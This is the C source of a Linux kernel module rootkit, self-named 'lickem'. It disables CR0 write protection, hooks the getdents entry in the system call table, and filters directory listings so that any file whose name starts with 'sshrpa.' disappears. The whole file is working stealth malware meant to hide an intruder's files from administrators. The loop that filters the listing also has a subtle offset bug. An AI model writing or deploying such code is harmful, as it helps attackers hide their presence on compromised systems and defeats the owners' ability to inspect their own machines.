#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/special_insns.h>
#include <linux/string.h>
#include "sysgen.h"

#define GETDENTS_SYSCALL_NUM	78
#define WRITE_PROTECT_FLAG	(1<<16)
#define HIDE_PREFIX		"sshrpa."
#define HIDE_PREFIX_SZ		(sizeof(HIDE_PREFIX) - 1)

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

MODULE_LICENSE("GPL"); // Is actually needed on some distros inorder to link with things

typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
sys_getdents_t sys_getdents_orig;


unsigned long (*arch_syscall_addr)(int nr) = NULL;

asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int boff;
	struct linux_dirent* ent;
	long ret = sys_getdents_orig(fd, dirent, count);
	char* dbuf;
	if (ret <= 0) {
		return ret;
	}
	dbuf = (char*)dirent;
	// go through the return and check it out
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);
		if (strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) {
			// copy forward the rest
			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
			ret -= ent->d_reclen;
		}
		boff += ent->d_reclen;
	}
	return ret;
}

static int __init lkm_init_module(void) {
	printk(KERN_INFO "lickem loaded\n");

	printk(KERN_INFO "sys_call_table @ %p\n", sys_call_table);
	
	sys_getdents_orig = (sys_getdents_t)((void**)sys_call_table)[GETDENTS_SYSCALL_NUM];
	
	printk(KERN_INFO "original sys_getdents @ %p\n", sys_getdents_orig);
	
	printk(KERN_INFO "cr0 before write enabled%016lx\n", read_cr0());
	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
	printk(KERN_INFO "cr0 during write enabled%016lx\n", read_cr0());
	
	sys_call_table[GETDENTS_SYSCALL_NUM] = sys_getdents_new;

	printk(KERN_INFO "cr0 after write enabled%016lx\n", read_cr0());
	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);

	printk(KERN_INFO "New one in place!\n");
	return 0;
}

static void __exit lkm_cleanup_module(void) {
	printk(KERN_INFO "lickem leaving\n");
	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
	sys_call_table[GETDENTS_SYSCALL_NUM] = sys_getdents_orig;
	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
	printk(KERN_INFO "Old one back!\n");
}

module_init(lkm_init_module);
module_exit(lkm_cleanup_module);
